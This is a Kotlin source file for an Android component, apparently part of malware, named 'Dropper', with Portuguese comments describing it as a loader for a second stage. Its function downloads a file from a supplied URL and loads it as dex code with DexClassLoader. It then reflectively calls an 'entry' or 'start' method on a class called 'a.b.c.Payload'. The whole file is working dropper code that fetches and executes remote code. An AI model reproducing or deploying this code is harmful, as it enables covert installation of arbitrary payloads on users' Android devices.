package com.serv.app.core

import android.content.Context
import dalvik.system.DexClassLoader
import java.io.File

/**
 * Baixa e carrega 2ª fase. Entrypoints esperados:
 *   - public static void entry(Context)
 *   - public static void start(Context)
 */
object Dropper {
    private const val CLASS_CANDIDATES = "a.b.c.Payload" // customizável no 2º estágio

    fun downloadAndLoad(ctx: Context, url: String): String {
        return try {
            val out = File(ctx.filesDir, "s2.bin")
            if (out.exists()) out.delete()
            Http.downloadTo(url, out)
            val dexDir = File(ctx.codeCacheDir, "s2").apply { mkdirs() }
            val loader = DexClassLoader(out.absolutePath, dexDir.absolutePath, null, ctx.classLoader)
            val cls = loader.loadClass(CLASS_CANDIDATES)
            var ok = false
            runCatching {
                cls.getMethod("entry", Context::class.java).invoke(null, ctx); ok = true
            }
            if (!ok) runCatching {
                cls.getMethod("start", Context::class.java).invoke(null, ctx); ok = true
            }
            if (ok) "OK: carregado" else "ERRO: entrypoint não encontrado"
        } catch (t: Throwable) {
            "ERRO dropper: ${t.javaClass.simpleName}:${t.message}"
        }
    }
}
